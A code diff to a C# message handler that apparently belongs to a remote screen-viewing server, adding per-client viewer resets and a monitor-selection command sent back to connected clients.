@@ -16,6 +16,7 @@ namespace Sweep.Services
         private readonly LazyServerHost _server;
         private readonly ObjectListView _listView;
         private ScreenViewer viewer;
+        private string previousid = string.Empty;
 
         public MessageHandler(LazyServerHost server, ObjectListView listView, int port)
         {
@@ -59,10 +60,7 @@ namespace Sweep.Services
                     await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                     break;
 
-                // <— add new msg‐types here —
-                // case "shutdown":
-                //     await HandleShutdownAsync(meta, e.ClientId);
-                //     break;
+                
 
                 default:
                     Console.WriteLine($"[WARN] Unknown msg type '{msgType}' from {e.ClientId}");
@@ -71,7 +69,7 @@ namespace Sweep.Services
         }
         private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
         {
-            if (viewer == null || viewer.IsDisposed)
+            if (viewer == null || viewer.IsDisposed || clientId != previousid)
             {
                 System.Windows.Forms.Control ctrl = _listView; // any control created on the UI thread
                 if (ctrl.InvokeRequired)
@@ -80,6 +78,7 @@ namespace Sweep.Services
                     {
                         viewer = new ScreenViewer();
                         viewer.Show();
+                        viewer.SetMonitors((int)meta["monitors"]);
                     }));
                 }
                 else
@@ -88,6 +87,7 @@ namespace Sweep.Services
                     viewer.Show();
                 }
             }
+            previousid = clientId;
 
             viewer.QualityChanged += async (string quality) => {
                 await _server.SendMessageToClient(clientId, new JObject {
@@ -110,6 +110,14 @@ namespace Sweep.Services
                 }.ToString());
             };
 
+            viewer.MonitorChanged += async (int yoy) => {
+                await _server.SendMessageToClient(clientId, new JObject
+                {
+                    ["command"] = "mon",
+                    ["idx"] = yoy
+                }.ToString());
+            };
+
             try
             {
                 Image shot;
@@ -117,6 +125,7 @@ namespace Sweep.Services
                     shot = Image.FromStream(ms);
 
                 viewer.SetScreen(shot);
+                
             }
             catch (Exception ex)
             {
